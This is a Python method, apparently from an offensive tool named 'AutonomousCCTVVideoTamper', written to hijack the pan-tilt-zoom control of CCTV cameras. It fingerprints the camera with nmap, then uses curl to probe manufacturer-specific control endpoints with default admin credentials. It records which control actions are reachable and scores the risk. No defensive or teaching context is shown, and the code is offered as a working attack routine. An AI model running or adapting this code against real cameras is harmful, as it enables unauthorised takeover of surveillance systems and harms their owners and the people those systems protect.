    def ptz_hijack(self, target, manufacturer="generic", port=80, credentials=None):
        """Attempt PTZ control hijack to redirect camera view."""
        self.audit_log = []
        if manufacturer == "generic":
            nmap_cmd = f"nmap -sV -p 80,554 --script=http-title {target}"
            nmap_result = execute_command(nmap_cmd)
            detected = _guess_camera_manufacturer([], nmap_result.get("stdout", ""))
            if detected != "generic":
                manufacturer = detected
        self._log("ptz_hijack", f"Attempting PTZ hijack on {target} (manufacturer: {manufacturer})")

        ptz = self.PTZ_ENDPOINTS.get(manufacturer, self.PTZ_ENDPOINTS["generic"])
        if manufacturer not in self.PTZ_ENDPOINTS:
            ptz.update(self.PTZ_ENDPOINTS["onvif"])

        auth_str = ""
        if credentials:
            auth_str = f"-u {credentials.get('username', 'admin')}:{credentials.get('password', 'admin')}"

        results = {}
        for action, endpoint in ptz.items():
            endpoint_url = endpoint.replace("{id}", "1")
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 5 {auth_str} http://{target}:{port}{endpoint_url}"
            result = execute_command(cmd, use_cache=False)
            status = result.get("stdout", "").strip().strip("'")
            accessible = status in ("200", "204", "301", "302")
            results[action] = {
                "endpoint": endpoint_url, "http_status": status,
                "accessible": accessible,
            }
            if accessible:
                self._log("ptz_control", f"PTZ action '{action}' accessible: HTTP {status}")

        controllable = sum(1 for r in results.values() if r["accessible"])
        return {
            "success": True, "target": target,
            "engine": "AutonomousCCTVVideoTamper",
            "strategy": "ptz_hijack",
            "manufacturer": manufacturer,
            "ptz_actions_tested": len(results),
            "ptz_actions_accessible": controllable,
            "ptz_controllable": controllable > 0,
            "results": results,
            "risk": "critical" if controllable >= 3 else "high" if controllable > 0 else "low",
            "audit_log": self.audit_log,
        }

